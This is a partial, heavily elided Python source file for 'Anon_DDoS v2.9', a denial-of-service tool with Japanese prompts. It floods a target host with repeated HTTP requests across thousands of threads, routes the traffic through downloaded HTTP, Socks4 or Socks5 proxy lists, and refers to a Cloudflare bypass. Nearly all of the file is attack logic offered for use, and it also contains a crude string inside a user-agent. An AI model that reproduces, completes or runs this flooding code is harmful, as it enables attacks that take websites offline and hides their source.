...
"Mozilla/5.0 (X11; Linux x86_64; rv:515.0; yuzuha_fuck) Gecko/20100101 Firefox/515.0",
...
black_lists = ["pornhub.com", "anonboot.pw", "fc2.com", "anonymous-japan.org"]
...
def logo():
    if sys.platform.startswith("linux"):
        ...
        os.system('color ' + random.choice(['a', 'b', 'c', 'd'])+ " & cls & title Anonymous ~ Anon_DDoS v2.9")
...
''')
    ...
    try:
        ...
        pass
    try:
        print("[*] バイパス : v" + str(method_pass_cf))
    except:
        pass
    try:
...
def start_url():
    ...
    if sys.platform.startswith("linux"):
        ...
        if (not os.path.isfile(path)):
            print("[!] NodeJsをインストールしてください。ダウンロード中... [!]")
...
def choice_down_proxies():
    ...
    choice4 = input("[?] " + str(filenam2) + "の新規リスト取得 [Y/N]: ")
    if (choice4 == "y") or (choice4 == "Y"):
        print("-----------------------------")
        print("|_--> 1: HTTP   Server")
        print("|_--> 2: Socks5 Server")
        sel_pr = input("[?] サーバ取得 [1/2]: ")
        if choice_mode == "proxy":
            if (sel_pr == "1") or (sel_pr == "HTTP") or (sel_pr == "http"):
            ...
            if (sel_pr == "1") or (sel_pr == "socks5") or (sel_pr == "SOCKS5"):
...
def numthreads():
    ...
    try:
        print("-----------------------------")
        threads = int(input("[*] スレッド [2000]: "))
    except ValueError:
        threads = int(2000)
        print ("[!] 選択されたスレッド " + str(threads) + " [!]\n")
    logo()
    begin()

def begin():
    choice6 = input('=*= Enterで開始します: ')
    if choice6 == "":
    ...
    def run(self):
        ...
        while True:
            try:
                ...
                #sys.stdout.flush()
                print("[!] Anon?DDoS | Proxy @ " + str (proxy[0]) + " => [" + host_url + ":" + str(port) + "]")
                try:
    ...
    def run(self):
        ...
        while True:
            try:
                ...
                s.send(str.encode(request))
                s.send(str.encode(request))
                print("[!] Anon?DDoS | Socks5 @ " +str(proxy[0])+ " => [" +host_url+ ":" +str(port)+ "]")
                try:
                    for y in range(multiple):
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                ...
                try:
                    ...
                    if str(port) == '443':
                        s = ssl.wrap_socket(s)
                    s.send(str.encode(request))
                    print("[!] Anon?DDoS | Socks4 @ " +str(proxy[0])+ " => [" +host_url+ ":" +str(port)+ "]")
                    try:
                        for y in range(multiple):
                            s.send(str.encode(request))
                    except:
    ...
    def run(self):
        ...
        while True:
            try:
                ...
                s.send(str.encode(request))
                s.send(str.encode(request))
                print("[+] Anon?DDoS | Home @ " + str(random.randint(0, 1000)) + " => " + str(host_url) + ":" + str(port))
                #req_code += 1
                #sys.stdout.write("[!] github.com/ghostapustaja | Sent [" +str(req_code)+ "] | Error [" +str(error)+ "]|=> [" +host_url+ ":" +str(port)+ "]\r")
                #sys.stdout.flush()
                try:
    ...
    def run(self):
        ...
        while True:
            try:
                ...
                print("[+] Anon?DDoS | JS-Normal @ " +str(random.randint(0, 1000))+ " => " +str(host_url))
                try:
                    for y in range(multiple):
                        http.request("GET", url,headers=headersx)
                except:
